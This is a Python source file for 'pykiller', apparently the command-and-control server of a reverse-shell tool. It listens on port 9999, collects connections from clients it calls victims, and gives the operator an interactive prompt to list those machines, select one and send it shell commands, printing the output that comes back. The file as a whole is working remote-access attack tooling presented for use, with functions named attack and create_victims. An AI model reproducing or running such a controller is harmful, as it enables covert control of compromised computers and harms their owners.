import os
import sys
import socket
import threading
import time
from queue import Queue
from termcolor import colored

print("""
 _______           _       _________ _        _        _______  _______
(  ____ )|\     /|| \    /\\\\__   __/( \      ( \      (  ____ \(  ____ )
| (    )|( \   / )|  \  / /   ) (   | (      | (      | (    \/| (    )|
| (____)| \ (_) / |  (_/ /    | |   | |      | |      | (__    | (____)|
|  _____)  \   /  |   _ (     | |   | |      | |      |  __)   |     __)
| (         ) (   |  ( \ \    | |   | |      | |      | (      | (\ (
| )         | |   |  /  \ \___) (___| (____/\| (____/\| (____/\| ) \ \__
|/          \_/   |_/    \/\_______/(_______/(_______/(_______/|/   \__/
""")

NUMBER_OF_THREADS = 2
JOB__NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg))
        time.sleep(5)
        socket_bind()


# Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:-1]
    del all_addresses[:-1]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            client_hostname = conn.recv(1024).decode("utf-8")
            address = address + (client_hostname,)
            # all_addresses.append(address)
            all_connections.append(conn)
            all_addresses.append(address)
            print(colored("\nConnection has beesn established: ", 'green') 
                  + address[0])
        except:
            print("Erro accepting connections")


# Interactive prompt for sending commands remotely
def start_pykiller():
    while True:
        cmd = input('pykiller> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print(colored("Command not recognized", 'yellow'))


# Display all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' \
                   + str(all_addresses[i][1]) + '\n'
    print(colored('+++++ Clients List +++++', 'blue') + '\n' + results)


# Select a target Client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print(colored("You are now connected to ", 'green') 
              + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print(colored("Not a valid selection", 'red'))
        return None


# Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break


# Create victim threads
def create_victims():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()


def attack():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_pykiller()
        queue.task_done()


def create_jobs():
    for x in JOB__NUMBER:
        queue.put(x)
    queue.join()

create_victims()
create_jobs()
